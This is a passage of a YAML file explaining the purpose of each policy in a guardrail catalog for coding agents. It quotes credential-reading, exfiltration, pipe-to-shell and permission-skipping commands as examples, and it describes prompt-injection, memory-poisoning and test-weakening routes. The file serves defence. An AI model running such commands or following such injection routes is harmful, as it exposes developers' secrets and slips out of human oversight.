# The parts of a policy doc that cannot be derived from its manifest.
#
# Everything factual -- mechanism, enforcement ceiling, gate parameters, eval counts, the
# surfaces a policy compiles to -- is read from base/<id>/ by tools/gen_policy_docs.py and
# checked in CI. Only judgement lives here: why the policy exists, and what is safe to
# change. Keeping the two apart is what stops a doc from claiming a control that is not
# there, which is the failure mode these docs would otherwise introduce.

agent-devenv-autoexec:
  solves: >
    Files that make a developer tool run code with nobody pressing run: an agent hook or
    credential helper, an endpoint override that sends the agent's key elsewhere, a task that
    runs when the folder opens, a dev container command that runs on the host, a shell-entry
    or git hook file, a git config key that runs a program. An agent prompt-injected into
    writing one of these gets code execution on the next open, clone or checkout.
  customise: >
    It ships at action warn (observe): it reports and never refuses. Measure what it reports
    with `chock check --history`, then move `hook.gate.action` to block. A reviewed line in a
    file that has comments may carry `chock: allow <rule-id>`, added by a person.

agent-discipline:
  solves: >
    Agents that edit a file they never read, declare work finished without running it, and
    "fix" a failing test by deleting the assertion that caught the bug. Each is individually
    small and each destroys the evidence that would have revealed it.
  customise: >
    The verification bar is the part worth tuning. If your project has no lint step, drop
    `lint_clean` rather than leaving a rule that cannot be satisfied -- a rule an agent
    routinely cannot meet teaches it that rules are advisory in general.

agent-permissions-scan:
  solves: >
    Permission grants an agent's config can hold that a line-based pattern cannot judge: a bare
    `Bash` or `WebFetch`, a `curl:*` or `git push:*` prefix wildcard, a star alone on its own line,
    an unquoted bypass default mode in YAML, a regex-all terminal auto-approve rule, and a deny
    entry that quietly disappears. An agent prompt-injected into widening its own grants gets
    unasked tool authority on the next session.
  customise: >
    It ships at action warn (observe): it reports and never refuses. Measure what it reports with
    `chock check --history`, then move `hook.gate.action` to block. A reviewed exception is a
    `{file, path, value}` entry under `waive` in `.chock/devenv.json`, added by a person in their
    own commit; the file is a closed schema and an unknown key voids every waiver in it.

block-curl-pipe-sh:
  solves: >
    The install instruction that runs code nobody read: `curl https://get.example.com | sh`.
    The bytes the server returns are executed the instant they arrive -- a compromised host,
    a redirected URL, or a payload that varies by user-agent all land as root-capable shell
    with no diff, no pin, and no chance to look first. It is the plainest supply-chain vector
    an agent will reach for, because every project's README suggests it.
  customise: >
    The guard blocks only a fetch wired DIRECTLY into a shell or script interpreter (a pipe,
    `bash -c "$(...)"`, or `bash <(...)`) -- `sh`/`bash`/`zsh` and `python`/`perl`/`ruby`/`node`
    alike, since piping a download into any of them runs the fetched code. Download-to-file and
    pipes into a non-interpreter tool (`jq`, `tar`, `grep`) stay allowed, because the safe form
    it points you toward -- fetch, read, then run -- must not itself be blocked. It matches the
    raw command text with regexes (it does not tokenize), so add your own fetch clients or
    interpreters there; read the manifest description first for the bypass classes (aliases,
    variable indirection, obfuscation) it cannot see.

block-destructive-commands:
  solves: >
    The command that cannot be undone: `rm -rf` against an absolute or home path, a force
    push over someone else's work, `git reset --hard` across uncommitted changes,
    `terraform destroy`. The cost is not the mistake, it is that there is nothing to
    recover from.
  customise: >
    The command list in the guard script is the whole policy; add the destructive commands
    your stack actually has (`helm uninstall`, `aws s3 rm --recursive`, `dropdb`). Read the
    manifest description first: it names the bypass classes this cannot see, and adding
    entries does not narrow them.

block-invisible-unicode:
  solves: >
    The one slice of prompt injection a diff can literally show. Bidi override
    characters make code read differently to a human than it parses (Trojan Source,
    CVE-2021-42574), and Unicode tag-block characters carry instructions a reviewer
    cannot see but the agent reading the file will happily obey. Both arrive through
    the most ordinary channel there is: a commit.
  customise: >
    The deliberate exclusions are the tuning surface. ZWJ/ZWNJ and the LRM/RLM marks
    are not matched because emoji sequences and Persian, Arabic and Indic text use
    them honestly; if your repo contains no internationalised content and you want
    the stricter net, add them to the character class. Keep the pattern as escapes,
    never literal characters -- the gate must not carry the bytes it blocks.

pin-github-actions:
  solves: >
    The one line of a workflow that trusts code it never froze. `owner/action` at a tag or
    branch resolves to whatever that ref points at when the job runs -- and the owner of the
    action, or anyone who compromises them, can move the tag to new code after the pull request
    that added it was reviewed and merged. The CI runner has repository secrets; the audited
    line and the executed line are simply not the same thing until the ref is a commit SHA.
  customise: >
    The gate blocks any action referenced by a non-SHA ref and passes a full 40-char SHA or a
    local (ref-less) action; the pattern lives in the manifest's `content_pattern`. It is strict
    on purpose -- even a specific version tag is re-pointable -- so a repo that has decided a
    trusted tag is acceptable marks the line with `pragma: allowlist unpinned-action`, which
    keeps the exception visible in the diff. Pair it with Dependabot to bump the pinned SHAs;
    signature and provenance verification are a separate, heavier control this does not attempt.

protect-agent-config:
  solves: >
    Self-modification: the agent editing its own authority. Instruction files,
    permission files and vendored enforcement define what the agent may do, and a
    one-line sed against .claude/settings.json rewrites those boundaries silently
    (MITRE ATLAS calls this Modify Agent Configuration, AML.T0081). Chock's drift
    checks detect tampering after the fact; this refuses the shell edit up front.
  customise: >
    The protected-path list mirrors the adapter set -- add your organisation's own
    agent config files. The escape marker ('chock: approved-config-change') is the
    point, not a loophole: it forces the approval to be visible in the command a
    human sees. Deliberately coarse on compound commands; split a blocked
    read-then-write into two steps rather than widening the guard.

block-wildcard-agent-permissions:
  solves: >
    Excessive agency as a committed artifact. A bare-wildcard allow-list or shell
    grant hands every future session unlimited tool authority, in a JSON file
    reviewers rarely read as code -- and unlike a risky command, a permission grant
    fires long after the commit that introduced it. The agent-world twin of
    block-wildcard-iam.
  customise: >
    Add the grant syntaxes of the agents you actually run -- the pattern ships with
    Claude-style permissions and MCP always-allow lists. Scoped wildcards like
    Bash(git status:*) pass by design; the gate blocks only the everything-grant,
    because a guard that argues with every scoped grant gets disabled within a week.

protect-ci-workflows:
  solves: >
    The gate an agent can quietly widen: its own CI. When the checks that must pass before a
    change lands live in the repo -- `.github/workflows/`, the composite actions they call, the
    dependabot config -- an agent fixing a red build can "fix" it by deleting the job that went
    red, loosening a trigger, or dropping a required scan, and the diff looks like just another
    edit. The work that was supposed to be reviewed then merges with the reviewer removed.
  customise: >
    The protected paths in the guard script are the whole policy: `.github/workflows/`,
    `.github/actions/`, `.github/dependabot.yml`. Add the CI config your stack actually keeps
    elsewhere (a `.gitlab-ci.yml`, a `Jenkinsfile`, a `.circleci/`). It refuses shell writes
    only -- reads pass and `chock sync` passes -- so an agent proposes CI changes in a PR for a
    human to merge. The escape marker is an audit trail, not authentication; the check an agent
    cannot self-approve is branch protection enforced server-side, which this does not replace.

protect-commit-privacy:
  solves: >
    A threat that did not exist before agents wrote commits: process leakage through
    authorship. A human curates what goes into a commit message; an agent narrates by
    default -- who asked, what the plan was, which discussion decided it -- and on a
    public repo that narration is published forever, in a place nobody reviews for
    privacy. This policy was authored from a live incident: the catalog's own maintainer
    found agent-written messages carrying private decisions toward a public launch.
  customise: >
    The MARKERS list in the guard is the whole policy, and it is deliberately narrow --
    phrases that describe the conversation, never single words like "user" that appear in
    honest messages about user-facing behaviour. Add your organisation's own tells
    (ticket-system phrases, internal codenames, private doc paths). If a marker keeps
    blocking legitimate messages, remove it: a guard that cannot be satisfied gets
    disabled within a week, and the rule half of this policy still does its work.

block-no-verify:
  solves: >
    Every other gate in this catalog, bypassed with six characters. `--no-verify` is
    reached for when a hook is failing and the failure is inconvenient, which is exactly
    when the hook is doing its job.
  customise: >
    There is little to tune, and that is the point. If you find yourself widening this one,
    the hook it keeps bypassing is the thing to fix.

block-unapproved-egress:
  solves: >
    The exfiltration step that any other gate leaves untouched: once an agent can run a
    shell, one `curl -d @.env https://somewhere` sends your secrets out the tool channel.
    This blocks the obvious reflex -- a network client that uploads a body to a host you
    have not allowlisted -- so the easy path costs the adversary a visible allowlist edit.
  customise: >
    The allowlist IS the policy. It ships as a default list of package and container
    registries; to change it, a person writes `.chock/egress-allowlist.txt` (one host per
    line, `*.example.com` for subdomains), which replaces the default whole. A broken file
    refuses every upload until it is fixed. Be honest about the ceiling: this is a tool-time
    floor, not a network sandbox. Non-standard clients, pipes into raw sockets and egress via
    a language runtime remain reachable -- containing a determined adversary needs real
    sandboxing -- and no pragma passes a command: ask the person to run it.

block-unpinned-agent-components:
  solves: >
    The MCP server added as `npx -y something@latest`, which re-resolves on every start.
    What was reviewed on Tuesday is not what runs on Thursday, and nothing in the repo
    records the switch. The ASI04 supply-chain policy can advise about provenance all it
    likes; the floating version is the part a diff literally states.
  customise: >
    The launcher list (`npx|uvx|bunx`) is the part to extend when your stack grows a new
    runner. Resist adding bare-launcher matching (no version suffix at all) -- it needs a
    parser, not a regex, and would flag every `npx` line. Dev-only compose files keep
    `:latest` honestly via the pragma, in the diff where review can see it.

block-unsafe-code-execution:
  solves: >
    The one-line distance between "agent output" and "arbitrary code": a bare `eval(`, a
    `shell=True`, a `pickle.loads` on bytes the agent fetched. Each is a single token in a
    diff, which makes them the rare ASI05 slice a commit-time gate can actually see.
  customise: >
    Add your stack's own sinks -- template engines with code execution, `Function`
    constructors in other guises. The lookbehind excluding dotted calls (`model.eval()`,
    `pattern.exec()`) is what keeps this gate satisfiable; if you find yourself deleting it
    to catch more, you are about to teach every adopter to disable the policy instead.

block-wildcard-iam:
  solves: >
    The agent role granted `"Action": "*"` on Friday afternoon to make the demo work,
    still attached in production a year later. A compromise of that agent is a compromise
    of everything the account reaches -- and the grant was one greppable line.
  customise: >
    Scoped wildcards (`s3:*`) pass deliberately; whether service-level breadth is too broad
    for your agent is the advisory policy's judgement, not a regex's. Note the JSON
    limitation: strict JSON carries no comments, so the pragma escape only exists in
    Terraform/YAML -- for raw JSON documents the options are narrowing the grant or moving
    the document.

iam-policy-scan:
  solves: >
    The wildcard grant that survives a line-by-line check because it was written over several
    lines: `"Action": [` then `"*"` on its own line, an Allow with `NotAction`, a statement
    pretty-printed by a formatter, a `jsonencode` object in Terraform, a YAML alias. The
    same one-line gate that catches `"Action": "*"` cannot see any of those; this one reads
    the whole document and judges the statement.
  customise: >
    New packs run in the `observe` rollout first (`rollout: observe` in `.chock/config.yaml`)
    until the false-positive rate on your own repository is known. A reviewed exception is
    a `# pragma: allowlist broad-privilege` comment beside the grant, or, for JSON, which
    cannot carry a comment, an entry in `.chock/iam-policy-scan.json` naming the path, the
    rule and the statement id the refusal prints. Computed grants (a reference, a function
    result) and templated YAML that will not parse are not judged.

code-safety:
  solves: >
    The four ways generated code becomes a liability: committed credentials, `eval`/`exec`
    on untrusted input, string-built SQL, and dependencies that do not exist. An agent
    proposes all four fluently and none of them look wrong in a diff.
  customise: >
    Add the patterns your language actually presents -- deserialization sinks, template
    injection, shell interpolation. This is advisory text, so being generous costs an
    agent's attention rather than a blocked commit.

context-hygiene:
  solves: >
    Long sessions that get worse rather than better. Resolved content stays inlined, stale
    observations accumulate, and the instruction that mattered ends up in the middle of a
    window where models attend to it least.
  customise: >
    The `> 3_turns` pruning threshold is a guess, not a measurement. Raise it for work that
    revisits the same files and lower it for broad exploration.

chock-mise:
  solves: >
    Every coding session starts from a blank agent. The developer re-explains how they work --
    their stack dialect, the patterns they reach for, the way they like to be spoken to -- and
    none of it survives to the next session or the next tool. This rule is the operating contract
    for that developer's chock-mise: the agent runs as a trained twin of its owner, applying the
    owner's profile where it exists and deferring to the project everywhere else.
  customise: >
    The rule is deliberately a contract, not a profile. The owner's actual craft, taste, habits
    and demeanor live in a generated chock-mise profile that this rule points at; edit that profile,
    not this text. The one line worth understanding before adopting is precedence: an explicit
    in-session instruction wins, then the project's committed standards, then the personal profile
    -- so the chock-mise profile never overrides a rule the team has agreed on; it only fills the
    silence, while an explicit in-session instruction still takes highest precedence. The
    boundary is consent-first: the profile holds only what the owner has explicitly taught, and the
    agent never infers or stores personal identity, employer-confidential content, or secrets --
    so an untaught profile is applied to nothing and sensitive data is never absorbed.

eu-ai-act-high-risk-triage:
  solves: >
    A ranking or eligibility model that lands in an Annex III domain -- hiring, credit,
    education, benefits -- without anyone deciding it had. Article 12 logging and Article 14
    human oversight are cheap to design in and expensive to retrofit, and the Digital AI
    Omnibus deferral to December 2027 reads as permission to skip them rather than as more
    time to do them properly.
  customise: >
    The domain list is the trigger surface and it is deliberately broad; narrow it to the
    domains your product can actually reach so the flag stays meaningful. What should not be
    softened is the escalation: the Article 6(3) derogation requires a documented assessment,
    and an agent that asserts it on its own has made the compliance decision for you.

eu-ai-act-prohibited-practices:
  solves: >
    Feature requests for things the AI Act bans outright -- a trust score reused across
    contexts, emotion inference over employees, a face-image scraper -- arriving as ordinary
    tickets. They are in force now, and the failure mode is an agent building the thing
    competently because nobody framed it as a legal question.
  customise: >
    The ban list tracks Article 5 and should be edited only to follow the law, not to fit a
    roadmap. The carve-outs are the part worth reading before you narrow anything: biometric
    verification, fraud detection, and safety or medical emotion detection are lawful, and a
    rule that refuses them teaches the agent to route around it.

eu-ai-act-transparency:
  solves: >
    Article 50 applies from August 2026 regardless of risk tier, and it is the one obligation
    that lives in code an agent touches routinely: the disclosure on a chat surface, the C2PA
    manifest on a generation endpoint, the provenance field a size optimisation quietly
    deletes.
  customise: >
    The marking mechanism is what varies -- C2PA for media, response metadata for text -- so
    name the one your stack uses rather than leaving the choice open. Leave the exemptions
    intact: assistive editing and non-substantial alteration are what stop this from firing
    on every autocomplete and being ignored as a result.

firecrawl-fallback-only:
  solves: >
    A metered web connector quietly becoming the default fetch path. Firecrawl exists for
    the research pages a direct fetch cannot read -- blocked, JS-rendered, rate-limited --
    but once connected it is one tool call away from serving every URL, spending credits
    and an external dependency on pages a plain fetch would have returned identically.
  customise: >
    The fallback conditions are the policy. Add conditions your sources actually hit
    (paywalls, geo-blocks) or drop ones they never do, and swap the connector name if your
    fallback scraper is a different service -- the native-first ordering is the part to
    keep.

git-safety:
  solves: >
    Git operations that lose work rather than record it: force pushes over shared history,
    hard resets across uncommitted changes, branch deletions, commits landing straight on
    the default branch.
  customise: >
    The `diff > 500_lines` threshold and the protected branch names are the two knobs that
    matter. Both are conventions, not findings, so set them to your team's.

java-security:
  solves: >
    A coding agent writing Java reaches for the construct that compiles and passes the test:
    `${col}` in a MyBatis ORDER BY, a SQL string glued together with `+`, `csrf().disable()` to
    get a POST working, `th:utext` so a bio renders, a trust-all TrustManager to get past a
    certificate error, `include=*` so the dashboard sees every actuator endpoint, a Log4j version
    from a tutorial. Each is a vulnerability a reviewer would catch and a scanner run at merge time
    reports after the agent has moved on. This policy refuses them as they are written and at the
    commit, with the fix and the CWE named in the refusal, across 79 security rules in nine packs
    -- core Java, crypto, Spring, Jakarta EE and the other frameworks, persistence, templates,
    logging, the build, and Android -- and 50 quality rules in seven more: the bugs, races, leaks,
    swallowed exceptions, slow paths, style breaches and assertion-free tests SpotBugs, Sonar, PMD
    and Checkstyle report. Every rule cites its evidence -- the CWE, the CVE or vendor advisory,
    the analyser rule it mirrors -- and carries the negative cases that keep it silent on the
    correct form: `#{}` and bind parameters, `th:text`, `parseClaimsJws`, AES-GCM, a named CORS
    origin, `"SHIPPED".equals(status)`, try-with-resources.
  customise: >
    Verdicts, never rules. `.chock/security.json` sets each pack, or each rule inside it, to
    `allow`, `deny` or `ask` -- a team with no Android app or no Spring switches that pack off in
    one line -- and asking to customize java security opens the guided page in this policy's own
    skill, which asks once per pack and writes the file. A rule the file does not name denies, so an
    upgrade's new rule runs until someone speaks for it. A single line is waived in place with
    `// chock: allow <rule-id>`, where the diff shows it. What a rule matches lives in
    `implementations/chock_security/data/<pack>.json` (API names, tokens, config keys, vulnerable
    version ranges) and `rules/<pack>/*.py`; a pattern in the selection file is refused, because a
    rule definable in JSON is a program in disguise. Adding a rule is a version bump of this one
    policy, never another folder.

injection-defense:
  solves: >
    An agent that reads a web page, a ticket, or a file, finds text addressed to it, and
    does what the text says. The content is data; treating it as instructions hands control
    of the session to whoever wrote it.
  customise: >
    Extend the egress rule to name the destinations you actually care about. The
    instructions-are-data principle itself should not be weakened -- narrow it and the
    policy stops being a boundary and becomes a suggestion.

memory-discipline:
  solves: >
    Memory that fills with things the repo already records -- file contents, git history,
    task scratch -- until the genuinely non-derivable facts are buried in it.
  customise: >
    Consolidation of near-duplicate facts and the decay policy are the tunable parts. What
    should not move is `verify(memory) before_recommend`: a memory that names a file or
    flag is a claim about a repo that has changed since.

owasp-asi01-agent-goal-hijack:
  solves: >
    An agent that reads a document, an email, or a ticket and quietly adopts whatever that
    content asks of it, while still reporting that it is doing the user's work. The hijack
    leaves no bad code behind, so code review never sees it.
  customise: >
    The context partition is the part that survives paraphrase; the tool bound is the part
    that survives everything. Tune the list of what counts as a sensitive action, not the
    requirement to show the raw action before one. Overlaps `injection-defense` by design:
    that one governs your coding agent's session, this one governs the product it builds.

owasp-asi02-tool-misuse:
  solves: >
    Tools that each behave exactly as specified and together do something nobody intended
    -- read_file plus http_post is an exfiltration path, and neither tool is at fault.
  customise: >
    The per-task tool sets are yours to define and are where nearly all the value is. Resist
    widening a set because one task occasionally needs one more tool; add the task instead.
    Keep `authorize(every_invocation)`: the standing grant is the defect this exists to stop.

owasp-asi03-identity-privilege-abuse:
  solves: >
    The personal access token lent to an agent "just to get it working", and the shared
    service account four agents authenticate with, which makes every action unattributable.
  customise: >
    TTLs should match your job durations rather than a round number. The clause not to
    weaken is scope intersection on delegation: an agent acting for a user must not exceed
    that user's own permissions, however broad the agent's own grant is.

owasp-asi04-agentic-supply-chain:
  solves: >
    A dependency tree that is never final. An agent that discovers tools at runtime can load
    something tonight that no lockfile, review, or SCA run has ever seen.
  customise: >
    The publisher allowlist is the practical control; expand it deliberately and by key, not
    by name. If you cannot remove runtime discovery, keep the load-time gate and log what
    actually loaded -- an AIBOM built from intent rather than observation is fiction.

owasp-asi05-unexpected-code-execution:
  solves: >
    Model output reaching an interpreter. Usually not through a dramatic sandbox escape but
    through an f-string, a subprocess with `shell=True`, or a sandbox that inherited the
    orchestrator's environment variables and therefore all its credentials.
  customise: >
    Egress allowlists are the expected local edit. The two lines to leave alone are secrets
    never mounted into the execution sandbox, and no untrusted string reaching a shell.
    If you have no sandbox, the honest change is to remove the interpreter, not to relax this.

owasp-asi06-memory-context-poisoning:
  solves: >
    A poisoned memory written in one session and paid out weeks later, in a conversation the
    attacker is not present for. Deleting the conversation does not delete the memory, and
    the logs of the exploited session look entirely normal.
  customise: >
    What is worth persisting is genuinely product-specific -- define it field by field. Keep
    ephemeral as the default and keep operator inspect and flush: without them, you cannot
    answer "why has it been telling this one customer the wrong thing for two weeks".

owasp-asi07-insecure-inter-agent-communication:
  solves: >
    A message bus where being on the bus is treated as permission to task anyone else on it,
    so a spoofed or replayed message is indistinguishable from a real delegation.
  customise: >
    The delegation allowlist is the edit that matters and should stay small enough to read.
    Do not drop replay protection because messages are "internal": internal is exactly where
    the approved-action replay lands.

owasp-asi08-cascading-failures:
  solves: >
    A hallucination at stage one arriving at stage four as an established premise, and a
    change freeze enforced by telling the agent about it rather than by revoking its access.
  customise: >
    Breaker thresholds must come from your own baseline; borrowed numbers either never fire
    or fire constantly. Keep the rule that an agent's self-report is not verification of its
    own action -- that is the clause the Replit incident turned on.

owasp-asi09-human-agent-trust:
  solves: >
    The reason "human in the loop" is not a mitigation for the other nine. If the human
    approves an agent-authored summary, the agent has approved itself through a proxy.
  customise: >
    Which actions count as sensitive is yours to set. What should not move is showing the
    resolved action rather than the templated one: `rm -rf $WORKDIR` is not a disclosure.
    If an action cannot be displayed legibly, shrink the action rather than the display.

owasp-asi10-rogue-agents:
  solves: >
    The agent nobody can point to an owner for, still running, still credentialed, doing
    something competently wrong across sessions while every dashboard reads green.
  customise: >
    Expiry length is the main dial, and it is also the compensating control if you cannot
    afford continuous monitoring. Baseline on breadth as well as volume: an agent touching
    entirely new resources at an ordinary request rate passes a rate-only baseline.

protect-main-branch:
  solves: >
    Work landing on the default branch without review. Not because the commit is wrong, but
    because nobody saw it -- and once it is pushed, the fix costs more than the review would
    have.
  customise: >
    `params.refs` is the branch list and takes fnmatch patterns, so `release/*` works
    alongside `main`. `params.config_key` names the git config key an adopter can set to
    override the list per clone.

scan-secrets:
  solves: >
    Credentials reaching history, where deleting them does not remove them. Every key that
    lands has to be rotated, and rotation is the expensive part.
  customise: >
    `params.content_pattern` is one regex and adding your own token formats is the main
    thing to do here -- internal key prefixes are exactly what a generic scanner misses.
    `params.forbidden_path_regex` covers file types; `params.allowlist_pragma` sets the
    inline escape for documented fixtures.

token-efficiency:
  solves: >
    Context spent on output nobody reads: full command dumps, broad searches, re-reading
    files that have not changed, reference material loaded before it is needed.
  customise: >
    Every number here is a budget, not a finding. Raise the output cap for work with large
    legitimate output; lower it when context pressure is the binding constraint.

verify-dependency-exists:
  solves: >
    Package hallucination, and the supply-chain attack built on it. Agents confidently
    suggest packages that do not exist; an attacker who registers that name gets code
    execution in every repo that installs it.
  customise: >
    The allowlist is the policy. `params.manifests` sets which files are watched, and
    `params.allowlist_file` where the approved names live. This one ships disabled because
    an empty allowlist blocks every dependency -- populate it first, then enable.

verify-mcp-allowlist:
  solves: >
    Config-as-attack-surface: agents auto-load MCP servers from repo-committed config, so a PR
    -- or an agent acting on injected instructions -- that adds a server entry to .mcp.json
    hands every future session a new tool surface, and nothing in the catalog watched it before
    this. A name match alone would not be enough; an attacker who reuses an approved server's
    name while pointing its command or args elsewhere needs the source checked too.
  customise: >
    The allowlist is the policy, and it ships inside the guard script itself rather than a
    separate file: guard-mode evals run against an empty sandbox repo, so an allowlist that
    lived anywhere else could never be exercised by this suite. Add your own approved servers
    as `name<TAB>source` lines; protect-agent-config's own protected-path coverage of every
    policy's `implementations/` already keeps a shell edit to this list honest, gated behind
    the same `chock: approved-config-change` marker. Covers Claude Code's `.mcp.json` only --
    agentseam has no recorded MCP-config-path for the other agents it lists, and this policy
    does not guess at one.
no-a11y-regression:
  solves: >
    An agent remediating accessibility can make it worse while the report says it improved.
    Emptying an existing `alt` to `alt=""` produces no violation at all -- empty alt is the correct
    marking for a decorative image, so every checker passes it -- and deleting a flagged element
    scores as a resolved violation. Both transitions are invisible to any tool that diffs
    violations rather than state, which is every tool in this space.
  customise: >
    The rule names the two transitions and the silence rule; it carries no element table, because
    no conformance claim is made. Run a checker for detection, and keep the review of added names
    in the pull request where a person already reads the diff. The mechanism that decides these
    transitions deterministically is prototyped at open-coder-ai/org-plan,
    `prototypes/a11y-guard` -- it is not wired as a guard here, because no adapter passes file
    content to one.

rtk-dangerous-actions-blocker:
  solves: >
    A project asked for exactly this guard and could not merge it: rtk-ai/rtk#1007 wants a
    PreToolUse hook that refuses `rm -rf /`, force pushes, credential reads and `DROP TABLE`,
    and asks before `rm -rf` on an ordinary directory, `git reset --hard` or a docker prune --
    while rtk's own hook contract says its hooks never block. This policy is that table,
    carved out under rtk's name, so it exists as a policy anyone can install beside rtk's
    rewrite hook rather than as code rtk cannot take. It is also the worked example of the
    catalog's premise: when someone wants a specific policy for a specific agent, the
    catalog carves it out with its own tooling, and the folder is theirs to fork.
  customise: >
    Two knobs carry rtk's opinions and are the ones to turn: `is_safe_dir` lists the
    directories `rm -rf` may delete without asking, and each `ask` call in the guard is one
    line away from a refusal (print the message and `exit 1`) or from silence (delete the
    call). The container rule is one `if`: remove the `in_container` guard to keep the file
    checks inside `docker exec`, which is what the base `block-destructive-commands` does.
    Read the manifest description first: it names the bypass classes this cannot see.
protect-test-integrity:
  solves: 'An agent asked to make a red suite green can do it by weakening the suite: deleting the failing test, cutting assertions, or replacing one with `assert True`. CI then goes green over a bug. This gate refuses those three shapes at commit, where the diff is visible, and points the agent back at the code under test.'
  customise: 'Edit `test_path_regex` for a test layout it does not know, and `assertion_pattern` for a framework whose assertions it does not recognise. `dummy_assertion_pattern` lists the vacuous forms. A deliberate removal is waived by a person with `chock: allow test-integrity` on an added line of the test file; the waiver is not honoured for an agent''s commit (`CHOCK_AGENT_COMMIT` set).'
block-test-skips:
  solves: A quieter way to green a suite than deleting a test is to skip it, or to focus one test with `.only` so the rest never run. protect-test-integrity counts assertions and cannot see that. This gate refuses a newly added skip or focus marker in a test file, at commit and while the agent writes, and ignores skips already committed.
  customise: 'The skip markers and the test-path regex are constants at the top of `implementations/block-test-skips-gate.py`; add a framework''s marker there. A reviewed skip is waived by a person with `chock: allow test-skip` on the line, honoured at commit only in chock 0.13.0, never in the agent.'
compromised-package-ioc:
  solves: A dependency bump can pull a release that was published by a stolen token and is known to be malicious -- chalk and debug in September 2025, nx, axios 1.14.1, litellm 1.82.8, the keyv worm. A registry unpublishes it within hours, but a lockfile written in that window keeps it, and an agent copying a version from an issue or a stale lockfile writes it back. This gate refuses the listed package versions, re-pointed action refs and IOC file names as they are added.
  customise: 'The list is `implementations/data/ioc.json`: each row names its ecosystem, package, exact versions (or `*`), incident, date and a cited source. A person refreshes it in a reviewed pull request from the weekly threat digest; CI fails 120 days after `as_of`. There is no in-line waiver. Adopt it under `rollout: observe` first.'
hardening-flags:
  solves: A change that adds -fno-stack-protector, -D_FORTIFY_SOURCE=0, -no-pie, -z execstack, or a kernel config that turns KASLR or the stack protector off silently removes a mitigation a compiler or kernel gives by default, and no test notices. This gate refuses those added settings in CMake, Make, meson, configure.ac, Cargo, build.rs, Go release scripts, Dockerfiles and kernel config, and asks about Rust release overflow-checks off and /dev/mem. It judges only what a change adds and is advisory about everything it cannot see (environment-set flags, generated build files, toolchain defaults).
  customise: 'The settings are rows in `implementations/data/flags.json` (id, tier block or ask, languages, regex, what it weakens); add a row and a case, bump `as_of`. A reviewed exception is waived by a person with `pragma: allowlist hardening-flag` in a comment on the same line (`#`, or `//` in build.rs), honoured at commit and CI, and in the agent only for a line already in HEAD. Ship it with rollout `observe` first.'
limit-diff-size:
  solves: A commit of thousands of hand-written lines cannot be reviewed, and an agent will produce one unless something stops it. git-safety only advised asking. This script counts the staged added plus removed lines, leaves out lockfiles, vendored and generated paths and binaries, and refuses above the limit with the largest files named.
  customise: Set `CHOCK_DIFF_LIMIT` to change the 500-line default. The exclusion lists are constants in `implementations/limit-diff-size-pre-commit.py`. A person may set `CHOCK_ALLOW_LARGE_DIFF=1` for one commit; it is ignored when `CHOCK_AGENT_COMMIT` is set, and an agent asks rather than setting it.
guard-memory-writes:
  solves: Agent memory rots when it fills with pasted diffs, whole code listings, repeated lines and, worst, credentials that then travel with the repository. This script judges only memory files and only what a change adds, and refuses those four things with a path and line for each.
  customise: The memory paths, the fenced-block limit and the git-history patterns are constants in `implementations/guard-memory-writes-gate.py`; the secret pattern is scan-secrets' verbatim, so update both together. There is no waiver.
review-like-a-red-team:
  solves: A gate can refuse the certain slice of a vulnerability shape and mark the uncertain slice as ask; nobody then reasons about the uncertain slice before the change lands. This skill hands the agent its own diff and its ask-tier findings with a twelve-step reviewer's method, triaged by a dated table of exclusions and precedents, and asks for a confirmed finding with an exploit scenario and a failing test, or a refutation left for a person. It is advisory and refuses nothing.
  customise: The triage table is `skill/references/triage.json`, a copy of the catalog's `data/triage.json` that the catalog's tests hold byte-identical and validate. Its floors (paths never excluded, verdict and rank floors, the confidence ceiling) are checked by the catalog's `tools/triage_tables.py`, not in an adopter's repository, so a change belongs in a catalog pull request; a locally edited copy is unchecked.
guard-deletion:
  solves: >
    A review catches the deleted check that nothing replaced -- the bound compare, the auth decorator,
    the escape call, the hardening flag -- because it reads the diff. A file-level scanner cannot: the
    line that mattered is gone, so there is nothing left to match. This gate reads the removed lines
    against the lines added beside them in the same hunk. A removed check with none of its kind beside
    it asks a person; a removed or weakened mitigation (hardening flag, security header, cookie
    attribute, TLS verification, row-level security, file mode) is refused. Several of those weakenings,
    written as added lines on their own, are other policies' business (agentic-code-security refuses TLS
    verification off in agent code, java-security the Java cookie and header forms); this one fires on
    the removal, so it adds the view they cannot have.
  customise: >
    The check shapes and the mitigation families are regexes in `implementations/data/shapes.json`, and
    the judged paths in `implementations/data/scope.json` (EP12 tables, dated and schema-checked); add a
    family there with a bad and a good eval. A person waives a reviewed hunk with `pragma: allowlist
    guard-removal` or `pragma: allowlist mitigation-removal` on a line in it; an agent's pragma counts
    only on a removed line HEAD already holds, and one an agent adds to a guard or mitigation line is a
    finding. Known limits, each a miss rather than a refusal: it is hunk-local, so a guard moved across
    hunks or files is not followed; a guard neutralised in place (`assert True`, a swapped middleware) is
    not seen; an insecure setting added with nothing removed is left to other policies; a commit whose only
    change is deleted files never reaches a script gate; a strong-to-plain stack protector downgrade is not
    seen; authorization wired by dependency injection or a config chain (FastAPI `Depends`, Spring
    `authorizeRequests`) is not read; files over 4000 lines are compared by line counts, not hunks; CI without a base ref or a push event
    file reads only the tip commit; a replacement line that only names a guard or header in a string (a log
    message) counts as keeping it; a file mode is judged on a swap to a weaker one, so a bare removed `chmod`
    and `umask` are not seen; CR-only line endings read as one line; a binary file with an unlisted suffix is
    read as text and asks; the path scope skips root `test`, `fixtures`, `evals`, `docs` and any `tests`,
    `vendor`, `node_modules` directory, and an agent's move of a file into a judged path from outside it asks.

block-unguarded-agent-spawn:
  solves: |
    An agent that launches another agent with its permission prompts switched off (`claude
    --dangerously-skip-permissions`, `codex --yolo`, `gemini --yolo`) hands that child every tool with no
    human in the loop, and every guard in this repository stops applying to what the child does. That is
    OWASP ASI10 (rogue agents): the unattended process acts outside the boundary the person set.
  customise: |
    Each agent's unsafe flags are one small function in `implementations/block-unguarded-agent-spawn.py`; add
    a program or a flag there and an eval case beside it. A sandbox you have proven safe is a reason to edit this policy in
    your own copy, not to run the flag past it.

block-secret-store-reads:
  solves: |
    A prompt-injected or careless agent can read a developer's credentials with one ordinary command: `cat ~/.npmrc`,
    `base64 ~/.aws/credentials`, `tar czf x.tgz ~/.ssh`, `gh auth token`. Once the value is in the transcript it
    can be sent anywhere, and the supply-chain worms of 2025 (s1ngularity, Shai-Hulud) did exactly this with the
    victim's own agent CLI. This guard refuses the read before it runs and tells the agent to ask the person for
    the one value it needs. Template files, listings and public keys stay readable.
  customise: |
    The stores, readers and token printers are one data file, `implementations/data/secret_stores.json`
    (365-day freshness, checked in CI); add a path or a reader there and an eval case beside it. A store that is a
